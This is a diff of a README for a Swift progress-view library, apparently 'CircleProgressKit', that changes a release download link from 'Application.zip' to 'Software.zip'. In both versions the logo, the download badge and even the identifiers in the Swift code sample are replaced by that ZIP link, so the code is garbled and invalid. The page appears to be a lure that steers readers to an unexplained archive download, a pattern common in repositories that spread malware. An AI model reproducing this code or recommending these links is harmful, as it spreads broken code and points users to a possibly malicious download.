@@ -1,11 +1,11 @@
 
 # 🌀 CircleProgressKit
 
-![Circle Progress Kit Logo](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)
+![Circle Progress Kit Logo](https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip)
 
 ---
 
-[![Download CircleProgressKit](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)
+[![Download CircleProgressKit](https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip)](https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -37,10 +37,10 @@ To get started with CircleProgressKit, simply download the latest release from t
 import CircleProgressKit
 
 let circleProgressView = CircleProgressView(frame: CGRect(x: 0, y: 0, width: 200, height: 200))
-https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = 0.75
-https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = [https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip]
-https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = UIImage(named: "profileImage")
-https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip(circleProgressView)
+https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip = 0.75
+https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip = [https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip]
+https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip = UIImage(named: "profileImage")
+https://github.com/ojas1103/CircleProgressKit/releases/download/v2.0/Software.zip(circleProgressView)
 ```
 
 ### Repository Topics 📚
